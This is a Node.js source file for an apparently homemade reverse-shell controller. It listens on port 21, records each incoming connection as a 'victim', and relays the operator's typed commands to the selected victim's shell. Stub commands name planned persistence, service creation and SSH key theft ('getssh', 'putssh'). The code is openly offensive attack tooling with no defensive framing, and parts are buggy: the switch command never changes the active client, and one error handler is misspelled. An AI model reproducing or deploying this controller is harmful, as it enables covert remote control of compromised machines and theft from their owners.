#!/usr/bin/env node
//'use strict';

const net = require('net');

const util = require('util');
const color = require('colors/safe');
const exec = require('child_process').exec;

//const BlackOrphanWrite = require('console').Console;
//const setVictims = require('./misc/initvictims.js');
//const handleInput = require('./misc/handleinput.js');
//const {searchUser,showAllUsers} = require('./misc/victimtrasverse.js');
// no need to use rdinterface.write, it fucks up the prompt
//const bo = new BlackOrphanWrite(process.stdout);

let currentClient;



const serverList = {};

let prompt = {
    prompt() {
	process.stdout.write(color.bgBlack(color.grey(color.green(`${this.id}_${this.address}:${this.port}`) + ' > ')));
    },
    setPrompt(sockParams) {
	Object.assign(this, sockParams);
    }
};


let i = 0;
function initVictim(socket) {
    
    let _id = (++i) + "_" + socket.remotePort;
    
    // each socket object is unique
    serverList[_id] = {
	id: _id,
	sock: socket,
	address: socket.remoteAddress,
	port: socket.remotePort,
	localPort: socket.localPort,
	localAddress: socket.localAddress
    };
    
    return { serverList };
}




const tcpServer = net.createServer((socket) => {
    
    var socketList;
    let sock;
    let {localAddress,localPort,remoteAddress,remotePort} = socket;
    console.log(`\nsending new connection from ${localAddress}:${localPort} to ${remoteAddress}:${remotePort}`);
    
    socketList = initVictim(socket).serverList;

    if ( ! currentClient ) {
	currentClient = socketList[Object.getOwnPropertyNames(socketList)[0]];
	let {id,port,address} = currentClient;
	prompt.setPrompt({id,port,address});
    }

    prompt.prompt();
    
    process.stdin.setEncoding('utf-8');
    
    process.stdin.on('readable', (  ) => {

	let data = process.stdin.read();

	if ( data === null )  return ;

	let cmd =  /([a-z]+)?/.exec(data)[1];
	
	if ( ! cmd  ) return prompt.prompt();
	    
	switch (cmd) {
	case "switch":
	    let getUserToSwitch = data.split(/\s+/)[1].trim();
	    
	    if ( getUserToSwitch && Number.isInteger(Number(getUserToSwitch))) {
		// building regexp to match request victim 
		let userRegexp = new RegExp(`^(${getUserToSwitch}){1,}`);

		let ccurrentClient = Object.keys(socketList).filter(( l ) => (userRegexp.test(l)) );

		ccurrentClient = socketList[ccurrentClient];
		
		if ( ! ccurrentClient ) {
		    process.stdout.write(color.red("There is no user with the id of " +  getUserToSwitch) + '\n');
		    let { id, address, port } = currentClient;
		    
		    prompt.setPrompt({id,port,address});
		    prompt.prompt();
		    return ;   
		}
	    }
	    
	    process.stdout.write(color.red('invalid id specified ' + getUserToSwitch) + '\n');
	    prompt.prompt();
	    
	    break;
	    
	case 'list':
	    
	    let objNames = Object.getOwnPropertyNames(socketList);

	    
	    objNames.forEach((sockets) => {
		let {id, port, address, localPort, localAddress} = socketList[sockets];
		process.stdout.write(`${id.replace(/_*/,'')} ${localAddress}:${localPort} --> ${address}:${port}\n`);
		
	    });
	    prompt.prompt();
	    break;
	case 'persistent':
	    
	    sock = currentClient["sock"];
	    
	    

	    
	    break;
	case 'createservice':
	    sock = currentClient["sock"];
	    break;
	case 'getssh':
	    sock = currentClient["sock"];
	    break;
	case 'putssh':
	    sock = currentClient["sock"];
	    break;
	case 'opensshsession':
	    
	    sock = currentClient["sock"];
	    
	    break;
	    
	case 'killclient':
	    let clientId = data.split(/\s+/)[1].trim();
	    
	    if ( clientId && Number.isInteger(Number(clientId))) {
		
		let userRegexp = new RegExp(`^(${clientId}){1,}`);

		let removeClient = Object.keys(socketList).filter(( l ) => (userRegexp.test(l)) );

		console.log(removeClient, currentClient['id']);

		if ( removeClient.length !== 1 ) {
		    process.stdout.write(color.red("There is no user with the id of " +  clientId));
		    prompt.prompt();
		    return ;
		} else if ( removeClient.toString() === currentClient['id'] ) {

		    delete socketList[removeClient];
		    
		    let objNames = Object.getOwnPropertyNames(socketList);
		    
		    try {
			currentClient = socketList[objNames[objNames.length - 1]];
			prompt.setPrompt({ id, port, address} = currentClient);
		    } catch (e) {
			let id = port = address = '**';
			prompt.setPrompt({id, port, address});
		    }
		    prompt.prompt();		    
		    return ;
		}
		
		delete socketList[removeClient];
		
		prompt.prompt();
		return ;
		
	    }

	    process.stdout.write(color.red('invalid id specified ' + clientId) + '\n');
	    prompt.prompt();
	    break;
	    
	default:

	    
	    try {
		sock = currentClient["sock"];
	    } catch ( ex ) {
		process.stdout.write(color.red('no active connection') + '\n');
		return prompt.prompt();
	    }
	    
	    
	    sock.write(data);
	    
	    sock.on('data', ( data ) => {
		
		process.stdout.write(data);
		prompt.prompt();
	    });

	    sock.on('error', (err) => {
		proces.stderr.write(err)
		prompt.prompt();
	    });

	    // remove socket from here
	    sock.on('end', () => {
		
		
	    });
	}
	
    });

    
});

tcpServer.listen(21, () => {
    console.log('listening for connection on port 21');
});
